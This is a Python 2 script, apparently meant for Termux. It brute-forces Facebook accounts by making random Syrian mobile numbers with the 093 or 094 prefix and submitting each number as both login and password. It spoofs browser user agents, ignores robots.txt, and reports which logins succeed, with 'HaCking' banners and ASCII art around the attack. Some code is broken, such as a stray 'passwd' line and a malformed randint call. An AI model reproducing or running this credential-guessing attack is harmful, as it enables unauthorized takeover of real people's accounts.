#!/usr/bin/env python
# encoding: utf-8
"""
Untitled.py
u
Created by Author Name on ٢٠١٨/١٢/٠٨.
Copyright (c) ٢٠١٨ Copyright Holder. All rights reserved.
"""
from os import system as sy
from random import randint as ran 
import sys
import os
import mechanize
import cookielib
import random
import time
Ramadi = '\033[1;30m'
A7mar = '\033[1;31m'
A5thar = '\033[1;32m'
Asfar = '\033[1;33m'
Azra9 = '\033[1;34m'
Roz = '\033[1;35m'
Azra92 = '\033[1;36m'

class Untitled:
        def __init__(self):
                passwd
os.system('clear')
time.sleep (1)
os.system('pkg update && pkg upgrade && pkg install python && pkg install python2 && pip2 install mechanize && pip install requests && pip2 install requests')
os.system('clear')
print(A7mar)
os.system('echo HaCking wait ........../')
time.sleep (2)
print(A5thar)
os.system('echo HaCking wait ............/')
time.sleep (2)
print(Asfar)
os.system('echo HaCking wait ............../')
time.sleep (2)
print(Azra9)
os.system('echo HaCking wait ................/')
time.sleep (2)
print(Ramadi)
os.system('echo HaCking wait ................../')
time.sleep (2)
print(Roz)
os.system('echo HaCking wait ..................../')
print(Azra92)
cc= """
           .aAHHHAAUUAAHHHAn.
          dHP^~"        "~^THb.
    .   .AHF                YHA.   .
    |  .AHHb.              .dHHA.  |
    |  HHAUAAHAbn      adAHAAUAHA        
    I  HF~"_____        ____ ]HHH  I
   HHI HAPK""~^YUHb  dAHHHHHHHHHH IHH
   HHI HHHD> .andHH  HHUUP^~YHHHH IHH
   YUI ]HHP     "~Y  P~"     THH[ IUP
    "  `HK                   ]HH'  "
        THAn.  .d.aAAn.b.  .dHHP
        ]HHHHAAUP" ~~ "YUAAHHHH[
        `HHP^~"  .annn.  "~^YHH'
         YHb    ~" "" "~    dHF
          "YAb..abdHHbndbndAP"
           THHAAb.  .adAHHF
            "UHHHHHHHHHHU"
              ]HHUUHHHHHH[
            .adHHb "HHHHHbn.
     ..andAAHHHHHHb.AHHHHHHHAAbnn..
.ndAAHHHHHHUUHHHHHHHHHHUP^~"~^YUHHHAAbn.
  "~^YUHHP"   "~^YUHHUP"        "^YUP^"
       ""         "~~"   """
print(cc)

print(Roz)


def Lar():
 #email = str(raw_input('email'))
  email = str(random.randint(20111111,20999999))
 #password = str(raw_input('password'))
  passwd = str(random.randint(1122334455))
s=str(raw_input('Enter The operator syria  093/094 :'))
def home():
    for x in range(300):
        if s == '093':
         f = str(ran(931111111,939999999))
        else:
            if s == '094':
             f = str(ran(941111111,949999999))
            else:
                exit()
        login = 'https://facebook.com/login.php?login_attempt=1'
        useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 .Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

        def Cr():
              br = mechanize.Browser()
              cj = cookielib.LWPCookieJar()
              br.set_handle_robots(False)
              br.set_handle_redirect(True)
              br.set_cookiejar(cj)
              br.set_handle_equiv(True)
              br.set_handle_referer(True)
              br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
              br.addheaders = [('User-agent', random.choice(useragents))]
              site = br.open(login)
              br.select_form(nr=0)
              br.form['email'] = '0' + f
              br.form['passwd'] = '0' + f
              sub = br.submit()
              log = sub.geturl()
              print(A5thar)
              print  'Loiding On The Accounts...' '0' + f
              if log != login and 'login_attempt' not in log:
                 print(Roz)
		 print  'Accounts is  Checking'
              else:
                 print(A7mar)
                 print 'Accounts not checking'

        Cr()

if __name__ == '__main__':
    home()
